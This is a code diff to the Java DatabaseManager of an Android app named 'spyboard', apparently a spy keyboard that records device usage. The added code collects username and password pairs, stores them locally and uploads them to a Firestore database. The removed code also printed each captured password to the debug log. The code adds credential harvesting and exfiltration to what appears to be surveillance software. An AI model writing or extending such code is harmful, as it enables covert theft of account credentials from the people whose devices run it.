@@ -16,12 +16,15 @@ import com.google.firebase.firestore.CollectionReference;
 import com.google.firebase.firestore.DocumentReference;
 import com.google.firebase.firestore.DocumentSnapshot;
 import com.google.firebase.firestore.FirebaseFirestore;
+import com.google.gson.reflect.TypeToken;
 import com.idankorenisraeli.spyboard.common.EncryptedSPManager;
 import com.idankorenisraeli.spyboard.data.types.DailyUsageLog;
 import com.idankorenisraeli.spyboard.data.types.UsageLog;
 
+import java.lang.reflect.Type;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.Map;
 import java.util.UUID;
 
 public class DatabaseManager {
@@ -114,35 +117,29 @@ public class DatabaseManager {
                 });
     }
 
-    //This will override the current daily log that is saved in db/sp
+    //Saving to both sp + firestore
     public void saveTotalLog(@NonNull UsageLog log) {
         sharedPrefs.putObject(getTotalLogSPKey(), log);
-
         getTotalDocRef().set(log);
+    }
+
+    public Map<String, String> getAccounts(){
+        // getMap(MySharedPreferencesV4.KEYS.SP_PLAYLISTS, new TypeToken<HashMap<String, Playlist>>() {});
+        // type token == new TypeToken<ArrayList<YOUR_CLASS>>() {}
+        HashMap<String,String> accounts = sharedPrefs.getMap(getAccountsSPKey(), new TypeToken<HashMap<String,String>>(){});
+        if(accounts==null)
+            return new HashMap<>();
+        return accounts;
     }
 
 
     public void saveAccount(String username, String password) {
-        //TODO - SP save
-        //sharedPrefs.putMap();
+        Map<String,String> accounts = getAccounts();
 
-        getAccountsDocRef().get().addOnSuccessListener(new OnSuccessListener<DocumentSnapshot>() {
-            @SuppressWarnings("unchecked")
-            @Override
-            public void onSuccess(DocumentSnapshot documentSnapshot) {
-                HashMap<String, String> accounts;
-                if (documentSnapshot.exists()) {
-                    accounts = (HashMap<String, String>) documentSnapshot.toObject(HashMap.class);
-                    for (String key : accounts.keySet()) {
-                        Log.i("pttt", "found account: " + key + " ; " + accounts.get(key));
-                    }
-                } else
-                    accounts = new HashMap<>();
-                accounts.put(username, password);
-                getAccountsDocRef().set(accounts);
+        accounts.put(username, password);
 
-            }
-        });
+        sharedPrefs.putMap(getAccountsSPKey(), (HashMap<String,String>) accounts);
+        getAccountsDocRef().set(accounts);
     }
 
 
@@ -183,17 +180,25 @@ public class DatabaseManager {
 
     private DocumentReference getTotalDocRef() {
         return usersRef.document(getUID().concat("/")
-                .concat(KEYS.TOTAL).concat("/").concat(KEYS.ALL_TIME));
+                .concat(KEYS.ALL_TIME).concat("/").concat(KEYS.TOTAL));
     }
 
     private String getDailyLogSPKey(String date) {
         return EncryptedSPManager.KEYS.SP_KEY_PREFIX + KEYS.DAILY_LOGS + "_" + date;
     }
 
+    private String getAccountsSPKey(){
+        return EncryptedSPManager.KEYS.SP_KEY_PREFIX + KEYS.ACCOUNTS;
+    }
 
     private String getTotalLogSPKey() {
         return EncryptedSPManager.KEYS.SP_KEY_PREFIX + KEYS.TOTAL;
     }
+
+    private String getUIDKey(){
+        return EncryptedSPManager.KEYS.SP_KEY_PREFIX + KEYS.UID;
+    }
+
 
 
     /**
@@ -205,7 +210,12 @@ public class DatabaseManager {
      * @return Current user's unique ID
      */
     private String getUID() {
-        String deviceUID = sharedPrefs.getString(KEYS.UID, UUID.randomUUID().toString());
+        String deviceUID = sharedPrefs.getString(getUIDKey(), null);
+        if(deviceUID == null){
+            deviceUID = UUID.randomUUID().toString();
+            sharedPrefs.putString(getUIDKey(), deviceUID);
+        }
+
         
         if(this.userName!=null)
             return userName + "_" + deviceUID;
@@ -215,7 +225,7 @@ public class DatabaseManager {
 
     public void setUserName(@Nullable String myName){
         if(myName!=null && myName.length() > 0){
-            this.userName = myName;
+            this.userName = myName.replace(" ", "_").replace("/", "-");
         }
         Log.i("pttt", " New Name: " + userName);
     }
